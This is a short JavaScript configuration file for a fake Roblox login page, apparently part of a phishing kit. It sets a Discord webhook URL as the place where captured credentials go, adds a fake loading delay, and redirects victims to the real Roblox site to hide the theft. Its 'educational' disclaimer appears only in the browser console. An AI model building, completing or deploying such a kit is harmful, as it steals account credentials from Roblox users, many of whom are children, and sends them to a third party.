// Configuration for Roblox Login Demo (Educational Use Only)
const CONFIG = {
    // Replace with your Discord webhook URL
    WEBHOOK_URL: "https://discord.com/api/webhooks/1411453235834654792/m4kwAhRpqLt6BS-uoe6wXE4kmaDOsapMg8t1R-l6zjxLLJbhaFNYpYuKkEzIxHtPKhBK",
    
    // Page behavior settings
    REDIRECT_DELAY: 2000, // milliseconds before redirecting to real Roblox
    LOADING_DELAY: 1500, // milliseconds for fake loading
    
    // Customization
    PAGE_TITLE: "Login to Roblox",
    
    // Educational disclaimer (displayed in console)
    DISCLAIMER: "This is an educational demonstration of phishing techniques for security awareness purposes. Do not use this to capture real user credentials without explicit permission."
};

// Log disclaimer
console.log("%cEDUCATIONAL DISCLAIMER", "color: red; font-weight: bold; font-size: 16px;");
console.log(CONFIG.DISCLAIMER);